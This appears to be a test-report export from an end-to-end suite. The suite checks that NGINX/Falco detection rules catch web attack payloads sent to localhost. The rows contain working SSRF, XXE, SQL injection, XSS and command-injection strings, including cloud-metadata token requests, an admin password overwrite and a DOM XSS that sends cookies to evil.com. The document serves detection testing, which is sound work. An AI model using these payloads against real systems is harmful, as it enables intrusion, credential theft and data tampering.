"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_INT_004` |
| **Name** | Kubernetes API via Lowercase Encoded Localhost |
| **Category** | SSRF |
| **Subcategory** | internal_service |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `http://localhost:8443/api/v1/pods`
- **Encoded**: `http%3a%2f%2flocalhost%3a8443%2fapi%2fv1%2fpods`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~30000ms
- **Timestamp**: 08:55:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_004-1772268959603-4lraif pattern_id=SSRF_INT_004 uri=/?q=http%3a%2f%2flocalhost%3a8443%2fapi%2fv1%2fpods client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_004-1772268959603-4lraif pattern_id=SSRF_INT_004 uri=/?q=http%3a%2f%2flocalhost%3a8443%2fapi%2fv1%2fpods client=127.0.0.1

**Falco Log Entry**:
```
08:55:59.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_004-1772268959603-4lraif pattern_id=SSRF_INT_004 uri=/?q=http%3a%2f%2flocalhost%3a8443%2fapi%2fv1%2fpods client=127.0.0.1
```","2","test_e2e_with_logs[613_SSRF_INT_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_SVG_001` |
| **Name** | XXE in SVG Image Upload |
| **Category** | XXE |
| **Subcategory** | svg_xxe |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<!DOCTYPE svg [<!ENTITY xxe SYSTEM ""http://169.254.169.254/meta-data"">]><svg xmlns=""http://www.w3.org/2000/svg"">&xxe;</svg>`
- **Encoded**: `%3C%21DOCTYPE%20svg%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F169.254.169.254%2Fmeta-data%22%3E%5D%3E%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%26xxe%3B%3C%2Fsvg%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~73000ms
- **Timestamp**: 08:55:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_SVG_001-1772268916607-dxb07 pattern_id=XXE_SVG_001 uri=/?q=%3C%21DOCTYPE%20svg%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F169.254.169.254%2Fmeta-data%22%3E%5D%3E%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%26xxe%3B%3C%2Fsvg%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_SVG_001-1772268916607-dxb07 pattern_id=XXE_SVG_001 uri=/?q=%3C%21DOCTYPE%20svg%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F169.254.169.254%2Fmeta-data%22%3E%5D%3E%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%26xxe%3B%3C%2Fsvg%3E client=127.0.0.1

**Falco Log Entry**:
```
08:55:16.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_SVG_001-1772268916607-dxb07 pattern_id=XXE_SVG_001 uri=/?q=%3C%21DOCTYPE%20svg%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F169.254.169.254%2Fmeta-data%22%3E%5D%3E%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%26xxe%3B%3C%2Fsvg%3E client=127.0.0.1
```","2","test_e2e_with_logs[749_XXE_SVG_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_MASS_003` |
| **Name** | Mass Assignment Role Admin Direct |
| **Category** | API_SECURITY |
| **Subcategory** | mass_assignment |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""email"":""test@test.com"",""role"":""admin""}`
- **Encoded**: `%7B%22email%22%3A%22test%40test.com%22%2C%22role%22%3A%22admin%22%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~50000ms
- **Timestamp**: 08:55:39.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_MASS_003-1772268939606-tknrc pattern_id=API_MASS_003 uri=/?q=%7B%22email%22%3A%22test%40test.com%22%2C%22role%22%3A%22admin%22%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_MASS_003-1772268939606-tknrc pattern_id=API_MASS_003 uri=/?q=%7B%22email%22%3A%22test%40test.com%22%2C%22role%22%3A%22admin%22%7D client=127.0.0.1

**Falco Log Entry**:
```
08:55:39.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_MASS_003-1772268939606-tknrc pattern_id=API_MASS_003 uri=/?q=%7B%22email%22%3A%22test%40test.com%22%2C%22role%22%3A%22admin%22%7D client=127.0.0.1
```","2","test_e2e_with_logs[653_API_MASS_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_POLY_005` |
| **Name** | SQL/XSS polyglot |
| **Category** | SQLI |
| **Subcategory** | polyglot |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'""><script>alert(1)</script>-- -`
- **Encoded**: `%27%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E--%20-`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 08:55:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=SQLI_POLY_005-1772268944239-iwx5ef pattern_id=SQLI_POLY_005 uri=/?q=%27%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E--%20- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=SQLI_POLY_005-1772268944239-iwx5ef pattern_id=SQLI_POLY_005 uri=/?q=%27%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E--%20- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:44.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=SQLI_POLY_005-1772268944239-iwx5ef pattern_id=SQLI_POLY_005 uri=/?q=%27%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E--%20- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[096_SQLI_POLY_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_009` |
| **Name** | Network interface configuration |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `; ifconfig`
- **Encoded**: `%3B%20ifconfig`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~90000ms
- **Timestamp**: 08:54:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_009-1772268899605-c5hgllm pattern_id=CMD_BASIC_009 uri=/?q=%3B%20ifconfig client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_009-1772268899605-c5hgllm pattern_id=CMD_BASIC_009 uri=/?q=%3B%20ifconfig client=127.0.0.1

**Falco Log Entry**:
```
08:54:59.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_009-1772268899605-c5hgllm pattern_id=CMD_BASIC_009 uri=/?q=%3B%20ifconfig client=127.0.0.1
```","2","test_e2e_with_logs[336_CMD_BASIC_009]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_006` |
| **Name** | URL encoded backtick execution |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%60id%60`
- **Encoded**: `%2560id%2560`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~74000ms
- **Timestamp**: 08:55:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_006-1772268915140-8nqhqt pattern_id=CMD_ENC_006 uri=/?q=%2560id%2560 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_006-1772268915140-8nqhqt pattern_id=CMD_ENC_006 uri=/?q=%2560id%2560 client=127.0.0.1

**Falco Log Entry**:
```
08:55:15.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_006-1772268915140-8nqhqt pattern_id=CMD_ENC_006 uri=/?q=%2560id%2560 client=127.0.0.1
```","2","test_e2e_with_logs[359_CMD_ENC_006]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_008` |
| **Name** | Textarea onfocus XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<textarea onfocus=alert('XSS') autofocus>`
- **Encoded**: `%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~100000ms
- **Timestamp**: 08:54:49.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_008-1772268889102-axy4ja pattern_id=XSS_REFL_008 uri=/?q=%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_008-1772268889102-axy4ja pattern_id=XSS_REFL_008 uri=/?q=%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:54:49.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_008-1772268889102-axy4ja pattern_id=XSS_REFL_008 uri=/?q=%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[213_XSS_REFL_008]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_STACK_003` |
| **Name** | Stacked query UPDATE SET attack |
| **Category** | SQLI |
| **Subcategory** | stacked_queries |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; UPDATE users SET password='hacked' WHERE username='admin'; --`
- **Encoded**: `'%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~93000ms
- **Timestamp**: 08:54:56.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_STACK_003-1772268896131-4jdotg pattern_id=SQLI_STACK_003 uri=/?q='%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_STACK_003-1772268896131-4jdotg pattern_id=SQLI_STACK_003 uri=/?q='%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:54:56.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_STACK_003-1772268896131-4jdotg pattern_id=SQLI_STACK_003 uri=/?q='%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[101_SQLI_STACK_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_AZURE_002` |
| **Name** | Azure OAuth2 token SSRF |
| **Category** | SSRF |
| **Subcategory** | cloud_metadata |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `http://169.254.169.254/metadata/identity/oauth2/token`
- **Encoded**: `http%3A%2F%2F169.254.169.254%2Fmetadata%2Fidentity%2Foauth2%2Ftoken`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~21000ms
- **Timestamp**: 08:56:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_AZURE_002-1772268968622-7yxg3u pattern_id=SSRF_AZURE_002 uri=/?q=http%3A%2F%2F169.254.169.254%2Fmetadata%2Fidentity%2Foauth2%2Ftoken client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_AZURE_002-1772268968622-7yxg3u pattern_id=SSRF_AZURE_002 uri=/?q=http%3A%2F%2F169.254.169.254%2Fmetadata%2Fidentity%2Foauth2%2Ftoken client=127.0.0.1

**Falco Log Entry**:
```
08:56:08.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_AZURE_002-1772268968622-7yxg3u pattern_id=SSRF_AZURE_002 uri=/?q=http%3A%2F%2F169.254.169.254%2Fmetadata%2Fidentity%2Foauth2%2Ftoken client=127.0.0.1
```","2","test_e2e_with_logs[423_SSRF_AZURE_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NEG_NORMAL_004` |
| **Name** | Normal form data |
| **Category** | OTHER |
| **Subcategory** | normal_request |
| **Severity** | `INFO` |

## Attack Details

- **Payload**: `name=John+Doe`
- **Encoded**: `name%3DJohn%2BDoe`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `NONE` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[686_NEG_NORMAL_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_018` |
| **Name** | URL encoded AND injection |
| **Category** | SQLI |
| **Subcategory** | boolean_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%27%20AND%20%271%27%3D%271`
- **Encoded**: `%2527%2520AND%2520%25271%2527%253D%25271`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~56000ms
- **Timestamp**: 08:55:33.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_BOOL_018-1772268933713-r105j3 pattern_id=SQLI_BOOL_018 uri=/?q=%2527%2520AND%2520%25271%2527%253D%25271 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_BOOL_018-1772268933713-r105j3 pattern_id=SQLI_BOOL_018 uri=/?q=%2527%2520AND%2520%25271%2527%253D%25271 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:33.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_BOOL_018-1772268933713-r105j3 pattern_id=SQLI_BOOL_018 uri=/?q=%2527%2520AND%2520%25271%2527%253D%25271 client=127.0.0.1 method=GET
```","3","test_e2e_with_logs[054_SQLI_BOOL_018]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_001` |
| **Name** | document.location manipulation |
| **Category** | XSS |
| **Subcategory** | dom_based_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `document.location='http://evil.com/?c='+document.cookie`
- **Encoded**: `document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~95000ms
- **Timestamp**: 08:54:54.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1772268894618-uj29cm pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1772268894618-uj29cm pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:54:54.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1772268894618-uj29cm pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[162_XSS_DOM_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_010` |
| **Name** | URL encoded extended sleep |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SLEEP%2810%29`
- **Encoded**: `SLEEP%252810%2529`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~104000ms
- **Timestamp**: 08:54:45.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_010-1772268885107-l0qtaj pattern_id=SQLI_TIME_010 uri=/?q=SLEEP%252810%2529 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_010-1772268885107-l0qtaj pattern_id=SQLI_TIME_010 uri=/?q=SLEEP%252810%2529 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:54:45.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_010-1772268885107-l0qtaj pattern_id=SQLI_TIME_010 uri=/?q=SLEEP%252810%2529 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[115_SQLI_TIME_010]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_005` |
| **Name** | Hex encoded whoami command |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `\x77\x68\x6f\x61\x6d\x69`
- **Encoded**: `%5Cx77%5Cx68%5Cx6f%5Cx61%5Cx6d%5Cx69`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","1","test_e2e_with_logs[358_CMD_ENC_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
